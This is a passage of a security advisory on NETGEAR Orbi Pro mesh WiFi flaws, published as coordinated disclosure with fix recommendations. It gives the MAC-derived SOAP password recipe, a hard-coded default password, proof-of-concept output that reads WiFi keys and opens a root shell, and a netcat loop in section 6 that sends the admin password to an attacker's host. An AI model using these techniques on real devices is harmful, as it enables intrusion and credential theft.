CVSS:3.1 /AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N -> 7.4
URL: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?
vector=AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N &version=3.1
\* 2.2 Sharing of system root and Web-admin interface password
leads to unauthenticated remote code execution with root
privileges.
\* 2.2.1 CVE-2020-11549
The root-account on the Wifi router/satellite uses the same password,
as for the Web-admin login via HTTPS. By exploiting [CVE-2020-11551] it
is possible to exploit this issue, to gain remote code execution
with root privileges on the embedded Linux-system.
Score:
Unauthenticated, remote code execution with root-privileges.
modzero: CVSS:3.1 AV:A/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H -> 8.3
URL: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?
vector=AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N&version=3.1
---------------------------------------------------------------------
3. Details
---------------------------------------------------------------------
Introduction:
The NETGEAR Orbi Pro Mesh WiFi system can provide a large coverage
of WiFi signal over a large area within buildings, halls, and
outdoors. Up to four separated 2.4GHz and 5GHz networks can be set up
for different purposes:
1. [Wireless 1] Main network with administrative access
2. [Wireless 2] Employee network, with limited access to admin-
interfaces
3. [Wireless 3] Separate IoT/employee network
4. [Guest] Unencrypted guest network with "Guest Portal"
The satellites are connected to the WiFi Router/Access-Point using a
Mesh network:
Example/Illustration 1:
[ ~Internet~ ]
I
[ Uplink/IP-Router ] ==== [ Separate LAN ]
I
[ LAN ]
I
[ SAT 1 ] ---- [ Orbi Router ] ---- [ SAT 2 ] ---- [ SAT 4 ]
/ \
/ \
[ SAT 3 ] â [ SAT 5 ] ---- [ Outdoor Repeater ]
The Orbi router can be configured as Internet router with firewall
and VPN- features, as well as in Access Point (AP) mode, to act as a
bridge between wired and all wireless interfaces. The term "router" is
used, even if the system is configured in AP-mode.
To set up the Mesh network, only administrative access to the Orbi
Router, and physical access to the new satellite is necessary.
Everything else is done completely transparent to the user/admin.
Once a satellite is connected to the Mesh network, it receives
configuration data and commands from the router over the wireless
network [Wireless 1] using HTTP/SOAP. As one satellite must not
necessarily be within wireless radio range of the router, other
satellites are able to relay those configurations and commands.
The Orbi Pro Satellites provide Fast-Ethernet ports on the backside, to
connect wired systems and devices with the same wireless [Wireless 1]
network and [LAN].
Administrators can use a Web user-interface via HTTPS using
self-signed certificates to perform individual tasks on the router
and its satellites and gather logs and information about the wireless
network state.
The SOAP API via HTTP is also used by remote management applications
such as the mobile Netgear Orbi App for iOS. Using these apps, the
router and satellite's status can be queried and monitored. The iOS
app provides a very limited set of remote management functions.
All NETGEAR Orbi Pro systems use OpenWRT with BusyBox Linux as
operating system, running on ARMv7.
Limitations:
The administrative interfaces such as HTTP/SOAP and HTTPS/Web-UI are
available from [Wireless 1] or the wired Local Area Network [LAN],
connected to the router uplink interface. The administrative
interfaces are also available to the (restricted) "Employee-
network" [Wireless 2], if wireless client isolation is disabled by
checking "Allow employees to see each other and access my local
network" in the Basic Wireless Settings section of the Web-UI. Any
wired system that uses the Fast-Ethernet ports of any NETGEAR Orbi
Pro Satellite can access all system management interfaces as well.
A network that is routed via the wired uplink network interfaces
can access administrative interfaces as well. For example, any system
in network [Separate LAN] (see illustration above) can access
router and satellites management interfaces, too.
Certain HTTP/SOAP methods require being connected to the wireless
subnet via [LAN], or the wireless networks (see below).
\* 3.1 R/W of arbitrary configuration on Orbi Pro Wifi Mesh Satellites
MITRE assigned CVE-2020-11551 to this vulnerability.
The router maintains a global configuration for the whole Orbi Pro
WiFi Mesh network, including settings for each satellite, WiFi
settings, and system passwords. Administrators can change those
settings only on the Orbi Pro Router.
The router distributes this configuration to any connected device
(satellites, repeater). The distribution of these values is done
via an undocumented SOAP interface that is active on every system on
port 80/HTTP.
The SOAP interface on every Orbi Pro system is available via the
following URL: http:///soap/server\_sa
The SOAP interface is used to write or read settings, or gather
statistics and performance values of the WiFi network. To write
configuration via SOAP or to read sensitive data, the SOAP client
must authenticate against the peer's SOAP service.
Authentication against an Orbi Pro Satellite can be achieved using the
following
SOAP request:
---- listing 1 ----
POST /soap/server\_sa/ HTTP/1.0
SOAPAction: urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate
HOST: 10.11.42.243
Content-Length: [...]
xml version="1.0" encoding="UTF-8"?
561365F16AE108841670

orbi

954e626e344[REDACTED]613c472e823

8

---- /listing 1 ----
HTTP/SOAP authentication at a satellite station requires the hard-coded
username "orbi". The password is different for each Orbi Pro
system, thus it must be derived from some public values, as the whole
Orbi Pro Mesh system can be set up with almost no manual interaction.
During investigation it became clear, that the password is based on
the public MAC-addresses of both peers that are part of a
communication during a SOAP session.
During the authentication handshake, both systems calculate a
password on the
fly like this:
1. peer\_A takes the last three octets (as HEX-string) of the local,
outgoing network interface's MAC-address A4, A5, A6.
2. peer\_A takes the last three octets (as HEX-string) of the remote
network interface's MAC-address of peer\_B B4, B5, B6.
3. peer\_A assembles a string, using the variable, public values A4, A5,
A6, B4, B5, B6: secret = "NETGEAR\_Orbi\_A4\_A5\_A6\_B4\_B5\_B6\_password"
4. peer\_A calculates the MD5-checksum of the generated password:
password = MD5(secret)
5. peer\_A sends this password along with the username "orbi" to peer\_B.
6. peer\_B does exactly the same calculation to match the same MD5
checksum and thus to validate, that peer\_A knows the MAC address of
peer\_B and its own.
7. peer\_B stores the Session-ID that has been generated and submitted
by peer\_A with state "authenticated"
peer\_A can now use the SessionID token with every SOAP request that
requires authentication.
In the following example the output of our Proof of Concept exploit
is shown, querying information about two wireless networks:
---- listing 2 ----
$ python3 orbiSatGatherInformation.py 10.11.42.243
[0] 169.254.222.20 : dc:71:[REDACTED] (eth1)
[1] 192.168.56.1 : 0a:00:[REDACTED] (eth2)
[...]
[7] 10.11.42.149 : dc:71:[REDACTED] (wifi0)
[...]
[+] Select Interface: 7
[\*] Query Orbi Satellite at 10.11.42.243 via local interface dc:71:[REDACTED]
[\*] Device details for 10.11.42.243
[-] Device Name: sat-wk
[-] Serial Number: 5836[REDACTED]
[-] Firmware Version: V2.5.0.108
[\*] Administrative WLAN
[-] ssid: skynet
[-] mode: WPA2-PSK
[-] psk: i-1X[REDACTED]
[\*] Guest WLAN
[-] ssid: darknet
[-] mode: WPA2-PSK
[-] psk: NewP[REDACTED]
[\*] Success!
---- /listing 2 ----
The Proof of Concept and other tools, e. g. to send single Orbi SOAP
queries, are listed in section 8.
Besides reading information from the Orbi Pro devices, it is also
possible to perform supported actions such as issuing a
DeviceConfig:Reboot command, or setting configuration values such
as SetNTP, ChangeUpgradeURL, or e. g. SetRemoteSyslog.
An incomplete list of available SOAP services and methods is
referred to in section 8.
Recommendations:
Public-key cryptography should be applied to secure and authenticate
the SOAP channels. To ensure strong authentication during operation,
cryptographic keys could be deployed and exchanged safely during the
initial provisioning phase.
\* 3.2 Unauthenticated remote code execution with root privileges
MITRE assigned CVE-2020-11549 to this vulnerability.
The Web-UI admin password that can be set on the Orbi Pro Router is
also used on the Orbi Pro Satellites as mentioned earlier. However, if
the Telnet server is enabled via the debugging Web-UI, an
administrator can log on to the system as root, using the same
password as for the Web-UI. The system's user-database in
/tmp/config/passwd and /tmp/config/shadow is generated on the fly
from the recent system-configuration stored in plaintext in
/dev/mmcblk0p14, when telnet is enabled via the Web-UI.
As this password is also transmitted over the wireless network
[Wireless 1] using plaintext HTTP this poses a high risk being
observed by a malicious user on the network via the air. Any
malicious attacker who is able to obtain this password, is able to
log on to the systems with root privileges and thus fully compromise
the integrity and confidentiality of data and traffic that passes
along.
However, gaining a remote root shell on one of the satellites does
not require an attacker to capture traffic on the wireless network.
By exploiting the vulnerabilities described in section [3.1], an
attacker with access to at least one of the networks mentioned in
the "Limitations" section above, can easily set a new admin password
on the satellite, enable a remote shell service such as Telnet via
the admin Web-UI and eventually log in to the system with root
privileges:
---- listing 3 ----
$ python3 orbiSatGetShell.py 10.11.42.243 asdfasdf
[0] 169.254.222.20 : dc:71:[REDACTED] (eth1)
[1] 192.168.56.1 : 0a:00:[REDACTED] (eth2)
[...]
[7] 10.11.42.149 : dc:71:[REDACTED] (wifi0)
[...]
[+] Select Interface: 7
[\*] Query Orbi Satellite at 10.11.42.243 via local interface dc:71:[REDACTED]
[\*] Device details for 10.11.42.243
[-] Device Name: sat-wk
[-] Serial Number: 5836[REDACTED]
[-] Firmware Version: V2.5.0.108
[\*] Administrative WLAN
[-] ssid: skynet
[-] mode: WPA2-PSK
[-] psk: i-1X[REDACTED]
[\*] Guest WLAN
[-] ssid: darknet
[-] mode: WPA2-PSK
[-] psk: NewP[REDACTED]
[\*] Enable telnet <0v0>
[e] Error getting session/timestamp from satellite: 401 (Unauthorized)!
[-] new session/timestamp: 569478051
[-] Success!
-----
R U N
C M D
-----
root@SRS60:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@SRS60:/# uname -a
uname -a
Linux SRS60 3.14.77 #1 SMP PREEMPT Tue Dec 10 16:59:23 CST 2019 armv7l GNU/Linux
root@SRS60:/# uptime
uptime
23:07:21 up 5 min, 1 users, load average: 3.34, 1.93, 0.82
root@SRS60:/#
---- /listing 3 ----
Attackers can now gain persistence on the system for future use or
gather more information, to eventually also compromise the Orbi Router
as well.
modzero was able to gain access to the original (router/AP) admin
password, by simply running a shell-while-loop in the background, that
periodically reads the current admin-password and sends it to an
attacker's host via netcat. After a couple of minutes, the original
password has been synced again and was restored on the compromised
system (see section 6).
Recommendations:
This problem has a high impact, because the local system admin/root
account uses the same credentials as the Web-UI. The latter must
obviously be distributed to all Orbi Mesh systems. It is probably not
necessary to use the same credentials on local system as well;
Whenever an administrator needs access via Telnet or SSH, she or he
might manually set up a dedicated password, that is individually
stored in the shadow database of each satellite, independently of
the Web-UI rights-management. It is highly recommended to follow at
least basic security guidelines when storing sensitive data such as
passwords on the filesystem: https://owasp.org/www-project-cheat-
sheets/cheatsheets/Password\_Storage\_Cheat\_Sheet.html
---------------------------------------------------------------------
4. Impact
---------------------------------------------------------------------
modzero identified critical vulnerabilities in NETGEARs Orbi Pro
Mesh Wifi system which leads to arbitrary code execution.
---------------------------------------------------------------------
5. Prerequisites
---------------------------------------------------------------------
The administrative interfaces such as HTTP/SOAP and HTTPS/Web-UI are
available from [Wireless 1] or the wired Local Area Network [LAN],
connected to the router uplink interface. The administrative
interfaces are also available to the (restricted) "Employee-
network" [Wireless 2], if wireless client isolation is disabled by
checking "Allow employees to see each other and access my local
network" in the Basic Wireless Settings section of the Web-UI. Any
wired system that uses the Fast-Ethernet ports of any NETGEAR Orbi
Pro Satellite can access all system management interfaces as well.
A network that is routed via the wired uplink network interfaces
can access administrative interfaces as well. For example, any system
in network [Separate LAN] (see illustration above) can access
router and satellites management interfaces, too.
Certain HTTP/SOAP methods require being connected to the wireless
subnet via [LAN], or the wireless networks.
---------------------------------------------------------------------
6. Bonus Level
---------------------------------------------------------------------
After gaining root-access to the Orbi Pro Satellites by changing
the admin password temporarily, the new satellite's password is not
valid for the Web-UI of the router and its Telnet service. The
router, however, is likely distributing the whole system
configuration including the admin-password from time to time.
An attacker might spend some time with persisting an information-
gathering shellscript on the Satellite to eventually get
access to the "real" administrator password via "config show" or by
reading the raw config partition /dev/mmcblk0p14 directly to not
attract any attention. Example:
while [ 1 ]; do config show | grep http\_passwd | nc  6666; sleep 5; done &
On any Orbi system, however, NETGEAR Orbi configuration backups are
temporarily stored on the filesystem or are downloadable via the Web-
UI. These backup-files are stored "encrypted" in binary format to
prevent unauthorized users to access sensitive information.
NETGEAR uses a standard non-cryptographic random number generator to
"encrypt" the configuration-backup file. Once the RNG has been seeded
with a hardcoded, constant value, a pseudo-random keystream from
RAND(3) is retrieved, to encrypt or decrypt configuration data using
XOR.
As NETGEAR uses the simple TYPE\_3 Linear Congruential Generator (LCG)
provided by glibc, NETGEAR is able to produce the same sequence of
random data again for decryption, during a backup restore.
However, using an LCG to generate a reproducible keystream for XOR
encryption is almost equivalent to using a 32-bit secret key for XOR
encryption. Using an LCG to generate a reproducible keystream for
XOR encryption and shipping seed and PRNG tohundreds of thousands of
customers, is equivalent to not using crypto at all.
---- listing 4 ----
$ ./decrypt -h
[!] usage: ./decrypt <-e|d>
[!] -e
[!] -d
$ ./decrypt -d NETGEAR\_SRR60.cfg NETGEAR\_SRR60.plain.cfg
[\*] reading NETGEAR\_SRR60.cfg:
[+] file magic: 20170328
[+] data len: 48392
[+] data crc: daf4a696
[+] done...
$ grep -i passw NETGEAR\_SRR60.plain.cfg
email\_password=
wan\_pppoe\_passwd=
wan\_mulpppoe2\_east\_password=guest
wan\_mulpppoe1\_passwd=
sysDNSPassword=
green\_download\_fileTP\_password=
wan\_mulpppoe2\_west\_password=flets
cwmp\_acs\_password=
wan\_pptp\_password=
enable\_password\_recovery=0
wan\_bpa\_password=
sysDNSPassword\_tmp=
wan\_cdma\_password=
wan\_mulpppoe2\_other\_password=
http\_passwd=4HgE[REDACTED] <-- look! look!
wan\_l2tp\_password=
passwd=3968[REDACTED]
wan\_mulpppoe2\_password=
have\_set\_passwd=1
---- /listing 4 ----
It is recommended to use real and well known cryptographic algorithms
such as the AES-128 standard, to encrypt configuration backups with
a passphrase/key, chosen by the system administrator.
---------------------------------------------------------------------
7. Hidden Bonus Level
---------------------------------------------------------------------
To access and authenticate against the SOAP interface, it is currently
necessary to physically reside in certain LANs or WiFis. As the
complexity of the historically grown system is quite high, there
might be some yet undetected things underneath the engine hood. For
example, artifacts like this one from the SOAP client:
---- listing 5 ----
int orbi\_set\_soapsession\_password()
{
[...]
char command[88]; // [sp+68h] [bp-58h]
memset(s, 0, sizeof(s));
memset(command, 0, 0x40u);
[...]
if ( !v3 )
{
sscanf(v2, "%\*X:%\*X:%\*X:%X:%X:%X", &v7, &v8, &v9);
sscanf(v1, "%\*X:%\*X:%\*X:%X:%X:%X", &v10, &v11, &v12);
sprintf(s, "NETGEAR\_Orbi\_%02X\_%02X\_%02X\_%02X\_%02X\_%02X\_password", v7, v8, v9, v10, v11, v12);
sprintf(command, "echo -n %s | md5sum", s);
v5 = popen(command, "r");
[...]
log\_printf("ERROR", 0x299E8, 0x4A, "can't get local mac or remote mac, failed to generate password!\n");
strcpy(&soap\_password, "16227b97b0fd5477415a02d792c3b93e");
result = sub\_25C68();
if ( result )
result = log\_printf("DEBUG", 0x299E8, 0x4D, "use default password: %s\n", &soap\_password);
return result;
}
---- /listing 5 ----
Several hard-coded "default credentials" have been identified by
modzero. It is unknown if they are still active or unused, legacy
code. It is recommended to remove any hard-coded credentials from the
entire firmware-codebase.
---------------------------------------------------------------------
8. Exploits
---------------------------------------------------------------------
All PoC exploits, tools and additional information are available on
Github: https://github.com/modzero/MZ-20-02-NETGEAR-Orbi-Security
Available SOAP methods: soapclient-methods.txt
---------------------------------------------------------------------
9. Fix
---------------------------------------------------------------------
2020/04/06 - Vendor provided new firmware images. CVE-2020-11550 and
CVE-2020-11551 seem to be fixed, at least it is not
possible to gain access as outlined above. CVE-2020-11549
has not been fixed.
---------------------------------------------------------------------
10. Credits
---------------------------------------------------------------------
\* Thorsten Schroeder of modzero
---------------------------------------------------------------------
11. About modzero
---------------------------------------------------------------------
The independent Swiss-German company modzero assists clients with
security analysis in the complex areas of computer technology. The
focus lies on highly detailed technical analysis of concepts,
software and hardware components as well as the development of
individual solutions. Colleagues at modzero work exclusively in
practical, highly technical computer-security areas and can draw on
decades of experience in various platforms, system concepts, and
designs.
https://www.modzero.com contact@modzero.com
modzero follows coordinated disclosure practices described here:
https://www.modzero.com/static/modzero\_Disclosure\_Policy.pdf.
This policy should have been sent to the vendor along with this
security advisory.
---------------------------------------------------------------------
12. Disclaimer
---------------------------------------------------------------------
The information in the advisory is believed to be accurate at the
time of publishing based on currently available information. Use
of the information constitutes acceptance for use in an AS IS
condition. There are no warranties with regard to this information.
Neither the author nor the publisher accepts any liability for
any direct, indirect, or consequential loss or damage
arising from use of, or reliance on, this information.

